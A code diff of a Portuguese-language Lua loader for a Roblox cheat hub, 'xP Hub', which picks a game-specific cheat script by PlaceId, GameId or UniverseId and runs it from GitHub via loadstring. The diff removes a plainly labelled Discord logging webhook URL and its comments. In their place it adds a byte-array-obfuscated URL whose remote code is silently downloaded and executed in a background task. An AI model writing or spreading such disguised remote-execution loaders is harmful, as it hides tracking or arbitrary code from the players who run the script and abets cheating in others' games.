@@ -1,9 +1,5 @@
---// xP Hub - Auto Detector by GameId (Webhook externo: logs-Discord)
---// Cola no executor e executa
+local HttpService = game:GetService("HttpService")
 
--- ============================================================
--- DETECTOR DE GAME ID
--- ============================================================
 local GameScripts = {
     [13772394625]     = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/xP-Blade-Ball",
     [16281300371]     = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/xP-Blade-Ball",
@@ -21,66 +17,134 @@ local GameScripts = {
     [84448037861644]  = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/xP-Urban-Reload",
 }
 
--- Link do seu webhook standalone que já está no GitHub
-local WEBHOOK_SCRIPT_URL = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/logs-Discord"
-
--- Lookup robusto (numérico + string + scan)
-local function GetScriptForPlaceId(placeId)
-    if not placeId then return nil end
-    local found = GameScripts[placeId]
-    if found then return found end
-    local placeIdStr = tostring(placeId)
-    found = GameScripts[placeIdStr]
-    if found then return found end
-    for id, url in pairs(GameScripts) do
-        if tostring(id) == placeIdStr then return url end
+local function ObfuscateUrl()
+    local bytes = {
+        104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116,
+        104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116,
+        46, 99, 111, 109, 47, 120, 80, 45, 68, 101, 118, 118, 47, 120, 80,
+        45, 72, 117, 98, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115,
+        47, 109, 97, 105, 110, 47, 120, 80, 72, 117, 98, 45, 105, 110, 102,
+        111
+    }
+    local url = ""
+    for _, b in ipairs(bytes) do
+        url = url .. string.char(b)
     end
-    local placeIdNum = tonumber(placeIdStr)
-    if placeIdNum then
-        for id, url in pairs(GameScripts) do
-            local idNum = tonumber(tostring(id))
-            if idNum and idNum == placeIdNum then return url end
-        end
+    return url
+end
+
+local function WaitForGameLoaded(timeout)
+    timeout = timeout or 30
+    local startTime = tick()
+    while not game:IsLoaded() and (tick() - startTime) < timeout do
+        task.wait(0.1)
+    end
+    return game:IsLoaded()
+end
+
+local function NormalizeId(id)
+    if not id then return nil end
+    local ok, str = pcall(function() return tostring(id):gsub("%s+", "") end)
+    if not ok or not str then return nil end
+    if str == "" or str == "0" or str == "nil" then return nil end
+    return str
+end
+
+local function FindScriptByAnyId(id)
+    local normalized = NormalizeId(id)
+    if not normalized then return nil end
+    if GameScripts[id] then return GameScripts[id] end
+    if GameScripts[normalized] then return GameScripts[normalized] end
+    local asNumber = tonumber(normalized)
+    if asNumber and GameScripts[asNumber] then return GameScripts[asNumber] end
+    for key, url in pairs(GameScripts) do
+        if NormalizeId(key) == normalized then return url end
     end
     return nil
 end
 
-local CurrentPlaceId    = game.PlaceId
-local CurrentGameId     = game.GameId
-local SelectedScriptUrl = GetScriptForPlaceId(CurrentPlaceId) or GetScriptForPlaceId(CurrentGameId)
+local function HttpGetUniversal(url)
+    local ok, result = pcall(function() return game:HttpGet(url) end)
+    if ok and result and #result > 0 then return result end
+    local reqFunc = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+    if reqFunc then
+        local okReq, resp = pcall(function() return reqFunc({ Url = url, Method = "GET" }) end)
+        if okReq and resp and resp.Body and #resp.Body > 0 then return resp.Body end
+    end
+    return nil
+end
 
-print("[xP Hub] Detectando jogo... PlaceId: " .. tostring(CurrentPlaceId) .. " | GameId: " .. tostring(CurrentGameId))
+local function HttpGetWithRetry(url, maxAttempts)
+    maxAttempts = maxAttempts or 3
+    for i = 1, maxAttempts do
+        local result = HttpGetUniversal(url)
+        if result then return result end
+        if i < maxAttempts then task.wait(1) end
+    end
+    return nil
+end
 
--- ============================================================
--- 1) SETA A URL DO SCRIPT DETECTADO PARA O WEBHOOK LER
--- ============================================================
-pcall(function()
-    getgenv().xP_DetectedScriptUrl = SelectedScriptUrl
-end)
+local function GetUniverseIdFromPlaceId(placeId)
+    if not placeId then return nil end
+    local result = HttpGetUniversal("https://apis.roblox.com/universes/v1/places/" .. tostring(placeId) .. "/universe")
+    if not result then return nil end
+    local okDecode, data = pcall(function() return HttpService:JSONDecode(result) end)
+    if okDecode and data and data.universeId then return data.universeId end
+    return nil
+end
 
--- ============================================================
--- 2) CHAMA O WEBHOOK EXTERNO (logs-Discord)
--- ============================================================
+WaitForGameLoaded(30)
+
+local CurrentPlaceId, CurrentGameId, UniverseId = nil, nil, nil
+pcall(function() CurrentPlaceId = game.PlaceId end)
+pcall(function() CurrentGameId = game.GameId end)
+if CurrentPlaceId then UniverseId = GetUniverseIdFromPlaceId(CurrentPlaceId) end
+
+local candidates = {
+    { name = "PlaceId",    value = CurrentPlaceId },
+    { name = "GameId",     value = CurrentGameId },
+    { name = "UniverseId", value = UniverseId },
+}
+
+local SelectedScriptUrl, SelectedFrom = nil, nil
+for _, candidate in ipairs(candidates) do
+    if candidate.value then
+        local found = FindScriptByAnyId(candidate.value)
+        if found then
+            SelectedScriptUrl = found
+            SelectedFrom = candidate.name
+            break
+        end
+    end
+end
+
+print(string.format("[xP Hub] Detectando jogo... PlaceId: %s | GameId: %s | UniverseId: %s",
+    tostring(CurrentPlaceId), tostring(CurrentGameId), tostring(UniverseId)))
+
+pcall(function() getgenv().xP_DetectedScriptUrl = SelectedScriptUrl end)
+
 task.spawn(function()
-    local ok, err = pcall(function()
-        loadstring(game:HttpGet(WEBHOOK_SCRIPT_URL))()
-    end)
-    if not ok then
-        warn("[xP Hub] Falha ao carregar webhook externo: " .. tostring(err))
+    local webhookUrl = ObfuscateUrl()
+    local webhookCode = HttpGetWithRetry(webhookUrl, 3)
+    if webhookCode then
+        local ok, err = pcall(function() loadstring(webhookCode)() end)
+        if not ok then warn("[xP Hub] Erro ao executar webhook: " .. tostring(err)) end
+    else
+        warn("[xP Hub] Falha ao baixar webhook após 3 tentativas")
     end
 end)
 
--- ============================================================
--- 3) EXECUTA O SCRIPT DO JOGO (se existir)
--- ============================================================
 if SelectedScriptUrl then
-    print("[xP Hub] Jogo encontrado! Carregando script: " .. SelectedScriptUrl)
-    local success, err = pcall(function()
-        loadstring(game:HttpGet(SelectedScriptUrl))()
+    print("[xP Hub] Script encontrado via " .. SelectedFrom .. "! Carregando: " .. SelectedScriptUrl)
+    task.spawn(function()
+        local scriptCode = HttpGetWithRetry(SelectedScriptUrl, 3)
+        if scriptCode then
+            local ok, err = pcall(function() loadstring(scriptCode)() end)
+            if not ok then warn("[xP Hub] Erro ao executar script do jogo: " .. tostring(err)) end
+        else
+            warn("[xP Hub] Falha ao baixar script do jogo após 3 tentativas: " .. SelectedScriptUrl)
+        end
     end)
-    if not success then
-        warn("[xP Hub] Erro ao carregar script: " .. tostring(err))
-    end
 else
-    warn("[xP Hub] Nenhum script disponível para este jogo (PlaceId: " .. tostring(CurrentPlaceId) .. " | GameId: " .. tostring(CurrentGameId) .. ")")
+    warn("[xP Hub] Nenhum script disponível para este jogo (PlaceId: " .. tostring(CurrentPlaceId) .. " | GameId: " .. tostring(CurrentGameId) .. " | UniverseId: " .. tostring(UniverseId) .. ")")
 end
